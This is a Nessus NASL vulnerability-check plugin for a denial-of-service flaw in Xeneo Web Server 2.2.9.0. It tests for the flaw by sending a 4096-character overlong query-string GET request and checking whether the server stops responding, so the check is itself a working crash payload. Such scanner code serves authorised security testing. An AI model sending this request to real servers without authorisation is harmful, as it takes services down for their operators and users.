#
# This script was written by BEKRAR Chaouki <bekrar@adconsulting.fr>
#
# Xeneo Web Server 2.2.9.0 Denial of Service
#
# http://www.k-otik.com/bugtraq/04.22.Xeneo.php
#
# From : "badpack3t" <badpack3t@security-protocols.com> 
# To   :  full-disclosure@lists.netsys.com
# Subject : Xeneo Web Server 2.2.9.0 Denial Of Service Vulnerability

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (6/27/09)


include("compat.inc");

if(description)
{
 script_id(11545);
 script_version ("$Revision: 1.8 $");
 script_xref(name:"OSVDB", value:"55337");

 script_name(english:"Xeneo Web Server 2.2.9.0 GET Request Remote Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"Requesting an overly long URL starting with a question mark (as in
'/?AAAAA[....]AAAA') crashes the remote Xeneo web server." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2003-q2/0347.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
script_end_attributes();

 
 script_summary(english:"Xeneo Web Server 2.2.9.0 DoS");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2009 A.D.Consulting France");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);

if ( ! can_host_php(port:port) ) exit(0);
banner = get_http_banner(port:port);
if ( ! banner || "Xeneo/" >!< banner ) exit(0);
if(http_is_dead(port:port))exit(0);
soc = http_open_socket(port);
if(soc)
{
 buffer = http_get(item:string("/?", crap(4096)), port:port);
 send(socket:soc, data:buffer);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 
 if(http_is_dead(port:port))security_warning(port);
}
